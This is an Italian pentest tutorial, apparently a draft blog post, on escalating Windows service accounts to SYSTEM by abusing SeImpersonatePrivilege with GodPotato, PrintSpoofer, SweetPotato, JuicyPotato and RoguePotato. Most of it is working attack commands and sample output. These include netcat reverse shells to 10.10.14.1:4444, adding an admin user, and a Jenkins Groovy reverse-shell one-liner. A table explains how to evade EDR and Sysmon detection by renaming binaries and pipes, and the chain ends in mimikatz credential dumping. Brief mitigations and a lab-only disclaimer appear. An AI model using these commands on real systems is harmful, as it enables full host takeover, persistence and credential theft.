---
title: 'SeImpersonatePrivilege: Privesc e Potato Attack fino a SYSTEM'
slug: seimpersonateprivilege
description: 'SeImpersonatePrivilege spiegato con i Potato attack: da IIS o SQL Server a SYSTEM, privilege escalation windows con i tool moderni usati nei lab.'
image: /seimpersonateprivilege.webp
draft: true
date: 2026-05-19T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - seimpersonateprivilege
  - potato attacks
  - godpotato
---

# SeImpersonatePrivilege: Exploit Completo dei Potato Attack su Windows (IIS → SYSTEM)

> Queste tecniche si applicano esclusivamente in ambienti autorizzati, laboratori e CTF.

Hai RCE su IIS o SQL Server e `whoami /priv` mostra `SeImpersonatePrivilege Enabled` — sei a due comandi da `nt authority\system`. Questo è il privilegio più sfruttato nei pentest Windows, presente per design su IIS, SQL Server, Jenkins e quasi ogni servizio standard. Non serve nessuna vulnerabilità aggiuntiva.

***

## Quick Exploit

```cmd
whoami /priv
GodPotato.exe -cmd "cmd /c whoami"
```

Output atteso:

```
nt authority\system
```

***

## Cos'è SeImpersonatePrivilege

Windows permette ai servizi di impersonare l'utente che si connette a loro — necessario ad esempio affinché IIS possa accedere ai file con i permessi dell'utente autenticato. Il problema: se riesci a far connettere SYSTEM al tuo processo, catturi il suo token. I Potato attack fanno esattamente questo — creano un endpoint (named pipe o interfaccia RPC/DCOM) a cui forzano la connessione di SYSTEM, catturano il token e avviano un processo con quei privilegi. Non è una vulnerabilità, è una feature usata nel modo sbagliato.

***

## Quando esiste

* **IIS Application Pool** — `IIS APPPOOL\DefaultAppPool` e tutti i pool custom, per design
* **SQL Server** — `NT SERVICE\MSSQLSERVER`, `NT SERVICE\SQLSERVERAGENT`
* **Jenkins / Tomcat / servizi Java su Windows**
* **Exchange Server** — account di servizio Exchange
* **Qualsiasi servizio Windows con account non hardened**

***

## Step 1 — Verifica il privilegio

```cmd
whoami /priv
```

Cerchi questa riga nell'output:

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

Rilevamento automatico con winPEAS:

```cmd
winPEAS.exe quiet tokencheck
```

Con Seatbelt per i dettagli completi del token corrente:

```cmd
Seatbelt.exe TokenPrivileges
```

Con accesschk per vedere chi altro ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeImpersonatePrivilege *
```

***

## Step 2 — Exploit con GodPotato

**GodPotato** è il tool più affidabile oggi. Sfrutta l'interfaccia RPC `IRemUnknown2` — non dipende dal Print Spooler e funziona su Windows 10, Server 2016, 2019 e 2022.

Verifica rapida dell'escalation:

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

Output atteso:

```
[*] CombaseModule: 0x140000000
[*] TargetMethod: IRemUnknown2
[*] CreateNamedPipe: \\.\pipe\godpotato-[random]
[+] Trigger RPCSS
[*] SYSTEM token captured
[+] CreateProcessAsUser OK
nt authority\system
```

Reverse shell:

```cmd
GodPotato.exe -cmd "C:\tools\nc.exe 10.10.14.1 4444 -e cmd"
```

Aggiunta utente admin locale:

```cmd
GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
```

***

## Varianti

### PrintSpoofer — Windows 10 / Server 2016–2019

PrintSpoofer sfrutta il Print Spooler per forzare la connessione di SYSTEM al tuo named pipe. Più leggero di GodPotato ma richiede il servizio Spooler attivo.

Prima verifica che lo Spooler sia in esecuzione:

```cmd
sc query spooler
```

Se lo stato è `RUNNING`, procedi:

```cmd
PrintSpoofer.exe -i -c cmd
```

Output:

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

Reverse shell:

```cmd
PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.1 4444 -e cmd"
```

### SweetPotato — multi-vettore automatico

SweetPotato prova in sequenza tre trigger diversi: PrintSpoofer → EfsRpc → StorSvc. Utile quando non sai quale trigger è disponibile o uno viene bloccato dall'EDR.

```cmd
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

Reverse shell:

```cmd
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.1 4444 -e cmd"
```

### JuicyPotato — ambienti legacy Windows 7 / Server 2008–2016

JuicyPotato sfrutta un meccanismo DCOM patchato su Server 2019+, quindi funziona solo su versioni più vecchie. Richiede un CLSID valido per la versione OS target.

CLSID comuni che funzionano su più versioni:

* `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` — BITS, funziona su Win7/2008/2012
* `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` — Print Spooler service
* `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}` — Wbem

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Reverse shell:

```cmd
JuicyPotato.exe -l 1337 -p C:\tools\nc.exe -a "10.10.14.1 4444 -e cmd" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Se un CLSID non funziona, prova il successivo dalla lista completa per versione OS: [ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Il flag `-t *` prova sia `CreateProcessWithTokenW` (SeImpersonatePrivilege) che `CreateProcessAsUser` (SeAssignPrimaryTokenPrivilege).

### RoguePotato — Server 2019+ alternativa a JuicyPotato

RoguePotato richiede un listener sulla macchina attaccante che faccia da relay DCOM.

**Sulla macchina attaccante (Linux):**

```bash
socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```

**Sul target (Windows):**

```cmd
RoguePotato.exe -r 10.10.14.1 -e "cmd.exe /c whoami" -l 9999
```

***

## Compatibilità tool

|     Tool     | Win7/2008 | Win10/2016 | Srv 2019 | Srv 2022 |
| :----------: | :-------: | :--------: | :------: | -------- |
|  JuicyPotato |     ✅     |      ✅     |     ❌    | ❌        |
|  RoguePotato |     ✅     |      ✅     |     ✅    | ⚠️       |
| PrintSpoofer |     ❌     |      ✅     |     ✅    | ⚠️       |
|  SweetPotato |     ❌     |      ✅     |     ✅    | ⚠️       |
|   GodPotato  |     ❌     |      ✅     |     ✅    | ✅        |

Parti sempre con GodPotato. Cambia solo se viene bloccato dall'EDR o non funziona nell'ambiente specifico.

***

## Attack Chain

```
RCE (webshell ASP / xp_cmdshell / Groovy console)
  → whoami /priv → SeImpersonatePrivilege Enabled
  → GodPotato.exe -cmd "..."
  → nt authority\system
  → mimikatz sekurlsa::logonpasswords / lateral movement
```

***

## Tool Decision

| Ambiente                                 | Tool consigliato                             |
| ---------------------------------------- | -------------------------------------------- |
| Server 2022 / qualsiasi versione moderna | **GodPotato** — default assoluto             |
| Win10 / Srv 2016–2019 + Spooler attivo   | **PrintSpoofer** — più leggero               |
| EDR aggressivo che blocca GodPotato      | **SweetPotato** (multi-trigger)              |
| Windows 7 / Server 2008–2016             | **JuicyPotato** con CLSID corretto           |
| Nessun tool su disco consentito          | Named pipe custom via P/Invoke in PowerShell |

***

## Scenari reali

**IIS webshell** — il caso più comune in OSCP e pentest enterprise. `IIS APPPOOL\DefaultAppPool` ha il privilegio per design. Chain: LFI → RCE → webshell ASP/ASPX → carica GodPotato → SYSTEM.

**SQL Server con xp\_cmdshell** — `NT SERVICE\MSSQLSERVER` ha il privilegio. Con accesso a xp\_cmdshell: `EXEC xp_cmdshell 'GodPotato.exe -cmd ...'` → SYSTEM.

**Jenkins agent su Windows** — dalla script console Groovy: `["cmd", "/c", "GodPotato.exe -cmd C:\\tools\\nc.exe 10.10.14.1 4444 -e cmd"].execute()` → SYSTEM sul build agent.

***

## Errori comuni

**GodPotato lancia il processo ma non è SYSTEM** — DCOM parzialmente ristretto nell'ambiente. Prova SweetPotato con vettore EfsRpc.

**`Access is denied` o privilegio non sfruttabile** — Il tool che usi non chiama `AdjustTokenPrivileges`. Passa a GodPotato che lo gestisce automaticamente.

**Binary bloccato da AV/EDR** — Rinomina `GodPotato.exe` in qualcosa di generico (`svchost.exe`, `update.exe`) o usa SweetPotato che ha una firma diversa. In ambienti con EDR comportamentale, usa un named pipe custom.

**PrintSpoofer non produce output** — Spooler non attivo. Verifica con `sc query spooler` prima di usarlo.

**JuicyPotato produce processo non-SYSTEM** — CLSID sbagliato per la versione OS. Prova i CLSID in ordine dalla lista: [ohpe/juicy-potato/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

***

## Quando fallisce

Il privilegio diventa inutilizzabile solo se si verificano **tutte** queste condizioni insieme (raro in produzione):

* Print Spooler disabilitato
* DCOM ristretto
* GodPotato bloccato dall'EDR
* Patch aggiornate su COM/RPC

Se GodPotato non funziona: prova SweetPotato con vettore EfsRpc, o rinomina il binary prima di caricarlo.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                    | Come lo bypassa il Red Team                                                            |
| ------------------------------------------- | -------------------------------------------------------------------------------------- |
| Sysmon 17/18 — named pipe anomalo           | Rinomina il pipe con stringa che imita pipe legittime: `\pipe\MsFteWds`, `\pipe\lsass` |
| Processi figli anomali `w3wp.exe → cmd.exe` | Usa payload in-memory invece di `cmd.exe` — lancia direttamente shellcode o PS         |
| Binary non firmato in `C:\Windows\Temp\`    | Carica da share UNC, path whitelistato o usa SweetPotato che opera diversamente        |
| Event ID 4624/4648 da account servizio      | Difficile da evitare — riduci il rumore usando connessioni brevi e payload minimi      |

***

## Mitigazioni

* Rimuovere SeImpersonatePrivilege dagli account di servizio non necessari (`secpol.msc` → User Rights Assignment)
* Usare **Group Managed Service Accounts (gMSA)**
* Disabilitare Print Spooler dove non serve: `sc config spooler start=disabled`

**Nota realistica:** Rimuovere SeImpersonatePrivilege da IIS rompe l'autenticazione Windows integrata se configurata. I gMSA richiedono ristrutturazione dei service account — operazione spesso rimandata. Nella realtà, la stragrande maggioranza dei server IIS e SQL in produzione ha ancora questo privilegio attivo.

***

## FAQ

**IIS ha sempre questo privilegio?**
Sì — ogni Application Pool lo ha per design. Non è una misconfiguration.

**Il privilegio è Disabled — funziona lo stesso?**
GodPotato abilita il privilegio automaticamente via `AdjustTokenPrivileges`. Disabled non è un blocco.

**Funziona su Windows 11 / Server 2022?**
GodPotato sì. Su Server 2022 con patch recenti prova SweetPotato con vettore EfsRpc se GodPotato non funziona.

***

SeImpersonatePrivilege trasforma qualsiasi RCE su un servizio Windows in una shell SYSTEM — è il privilegio che trovi più spesso nei pentest reali. Una volta ottenuto SYSTEM, il passo successivo è il dump delle credenziali: vedi [SeDebugPrivilege](05-sedebugprivilege.md) per estrarre hash da LSASS senza tool esterni.

***

**Articoli correlati:**

* [SeAssignPrimaryTokenPrivilege](https://hackita.it/articoli/seassignprimarytokenprivilege) — l'altro privilegio dei Potato attack, spesso dimenticato nell'hardening
* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — dump LSASS e credential access post-SYSTEM
* [SeCreateTokenPrivilege](https://hackita.it/articoli/secreatetokenprivilege) — token forgery senza dipendenze esterne
* [winPEAS](https://hackita.it/articoli/winpeas/) — guida completa all'uso

**Riferimenti:** [GodPotato](https://github.com/BeichenDream/GodPotato) · [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) · [SweetPotato](https://github.com/CCob/SweetPotato) · [JuicyPotato CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)

Per assessment della superficie IIS e service account Windows: [hackita.it/servizi](https://hackita.it/servizi)
